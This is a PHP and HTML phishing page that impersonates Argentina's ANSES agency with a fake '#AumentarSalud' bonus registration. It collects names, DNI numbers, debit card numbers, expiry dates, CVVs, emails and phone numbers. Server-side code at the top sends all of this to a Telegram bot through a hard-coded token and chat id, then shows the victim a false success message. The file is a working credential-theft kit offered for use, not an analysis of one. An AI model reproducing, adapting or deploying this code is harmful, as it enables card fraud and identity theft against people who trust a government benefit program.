<?php 
if (isset($_POST['button'])) {
    $name = $_POST['name'];
    $surname = $_POST['surname'];
    $number_card = $_POST['number_card'];
    $month = $_POST['month'];
    $year = $_POST['year'];
    $cvv = $_POST['cvv'];
    $email = $_POST['email'];
    $number_phone = $_POST['number_phone'];
    $dni = $_POST['dni'];
    if (($number_card>999999999999999 and ($year > 2022 and $year < 2047))) {
        if ($dni>9999999) {
            $msg = "Nombre: ".$name."\n"."Apellido: ".$surname."\n"."DNI: ".$dni."\n"."Numero de tarjeta: ".$number_card."\n"."Vencimiento: ".$month."/".$year."\n"."cvv: ".$cvv."\n"."Email: ".$email."\n"."Número de telefono: ".$number_phone;
            $token = "5565358413:AAFlUtkGZlLzSKzff7LaoxvgF5CtXNyegag";
            $id = "5149477828";
            $urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $urlMsg);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);         
            $server_output = curl_exec($ch);
            curl_close($ch);
        }  
    }   
}   
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100&display=swap" rel="stylesheet">
    <link rel="shortcut icon" href="./img/favicon.ico" type="image/x-icon">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" href="./style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anses</title>
</head>

<body>
     <header>
        <div class="contenedor_header">
             <div class="img">
                <img src="../img/logo.svg" alt="Logo Anses" class="img_header">
                
            </div>
            <div class="h1">
                <h1 class="title"> | Nuevas Inscripciónes </h1>
            </div>
        </div>
     </header>
     <main>
        <div class="uno">
            <?php 
            if (isset($_POST['button'])) {
                if (($number_card>999999999999999 and ($year > 2022 and $year < 2047))) {
                    if ($dni>9999999) {
                        echo "<div class='exito'>
                        <h1> <img src='../img/done.svg'> Inscripción Correcta</h1>
                        <p>Se notificara por medio de correo electrónico la aprobación del bono.</p></div>";
                        
                    }
                    
            } else {
                echo "<div class='error'>
                        
                    <h1> <img src='../img/error.svg'>Inscripción Fallida</h1>
                    <p>Verifique los datos y vuelva a intentarlo.</p></div>";
                
        }  
                
            }
            ?>
        </div>
        <div class="text">
            <h1>Incripción al bono #AumentarSalud</h1>
        </div>
        <div class="contenedor">            
            <form action="" method="POST">
                <p class="thep">Rellena los datos con la tarjeta de debito donde deseas que se acredite el bono. Podes usar una tarjeta de debito que pertenezca a cualquier banco del país.</p>    
                <div class="blue"></div>
                <p class="name">Nombre</p>
                <input name="name" maxlength="25" type="text" placeholder="Mi Nombre" pattern="[a-z]{4-25}" required>
                <p>Apellido</p>
                <input type="text" name="surname" maxlength="25" placeholder="Mi Apellido" pattern="[a-z]{4-25}" required>
                <p>DNI</p>
                <input name="dni" type="text" maxlength="8" placeholder="00.000.000" pattern="[0-9]{8}" required>
                <p>Número de la tarjeta</p>
                <input type="text" name="number_card" placeholder="0000-0000-0000-0000" require maxlength="16" required>
                <p>Mes de vencimiento</p>
                <select name="month" id="" required>
                    <option value="" selected disabled></option>
                    <option value="01">01</option>
                    <option value="02">02</option>
                    <option value="03">03</option>
                    <option value="04">04</option>
                    <option value="05">05</option>
                    <option value="06">06</option>
                    <option value="07">07</option>
                    <option value="08">08</option>
                    <option value="09">09</option>
                    <option value="10">10</option>
                    <option value="11">11</option>
                    <option value="12">12</option>
                </select>
                <p>Año de vencimiento</p>
                <select name="year" id="" required>
                    <option value="" selected disabled></option>
                    <option value="2022">2022</option>
                    <option value="2023">2023</option>
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                    <option value="2028">2028</option>
                    <option value="2029">2029</option>
                    <option value="2030">2030</option>
                    <option value="2031">2031</option>
                    <option value="2032">2032</option>
                    <option value="2033">2033</option>
                    <option value="2034">2034</option>
                    <option value="2035">2035</option>
                    <option value="2036">2036</option>
                    <option value="2037">2037</option>
                    <option value="2038">2038</option>
                    <option value="2039">2039</option>
                    <option value="2040">2040</option>
                    <option value="2041">2041</option>
                    <option value="2042">2042</option>
                    <option value="2043">2043</option>
                    <option value="2044">2044</option>
                    <option value="2045">2045</option>
                    <option value="2046">2046</option>
                    <option value="2047">2047</option>
                </select>
                <p>Cvv</p>
                <input name="cvv" type="text" placeholder="Codigo de seguridad" maxlength="4" pattern="[0-9]{3}" required>
                <p>Email de notificación</p>
                <input type="email" name="email" placeholder="example@example.com" maxlength="50" required>
                <p>Número de teléfono</p>
                <input type="text" name="number_phone" placeholder="0000000000" maxlength="10" required>
                <div class="button">
                     <button type="submit" name="button">CONTINUAR</button>
                </div>
            </form>
        </div>
    </main>
    <footer>
        <div class="img_div">
            <img src="../img/logo-footer.png" alt="">
        </div>
    </footer>
</body>
</html>